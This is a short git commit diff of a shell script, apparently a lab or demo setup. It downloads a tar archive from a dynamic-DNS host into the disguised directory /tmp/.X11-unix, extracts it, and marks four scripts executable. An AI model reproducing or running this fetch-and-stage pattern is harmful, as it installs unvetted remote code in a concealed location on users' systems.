ee83d9ca57efef47bc4a42423ba4553911175ebd
arugva-lab <arugva21@gmail.com>
2026-05-07 22:17:18 +0500

    Update main.sh

--- main.sh
+++ main.sh
@@ -3,7 +3,7 @@ mkdir -p /tmp/.X11-unix/
 wget -qP /tmp/.X11-unix http://kebab-na-ogne.duckdns.org:35035/demo2026.tar
 tar -xf /tmp/.X11-unix/demo2026.tar -C /tmp/.X11-unix
 
-chmod +x /tmp/.X11-unix/11_init.sh
-chmod +x /tmp/.X11-unix/12_routing.sh
-chmod +x /tmp/.X11-unix/21_xz.sh
-chmod +x /tmp/.X11-unix/22_neebu.sh
+chmod +x /tmp/.X11-unix/demo2026/11_init.sh
+chmod +x /tmp/.X11-unix/demo2026/12_routing.sh
+chmod +x /tmp/.X11-unix/demo2026/21_xz.sh
+chmod +x /tmp/.X11-unix/demo2026/22_neebu.sh
